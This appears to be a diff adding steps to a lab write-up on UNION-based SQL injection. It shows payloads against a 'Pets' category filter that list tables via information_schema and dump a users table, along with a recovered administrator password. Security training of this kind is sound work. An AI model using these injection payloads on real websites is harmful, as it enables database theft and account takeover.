@@ -10,3 +10,13 @@ This is a non-Oracle database, so we need to make user of information_schema.tab
 >Pets' union select table_name,NULL from information_schema.tables--
 
 This returns all of the tables in the database.
+
+Look for a non-standard table `users_xgouhg`
+
+>Pets' union select * from users_xgouhg--
+
+```administrator
+8bd235i2g39fg3h6865g
+```
+
+Chaching 💸
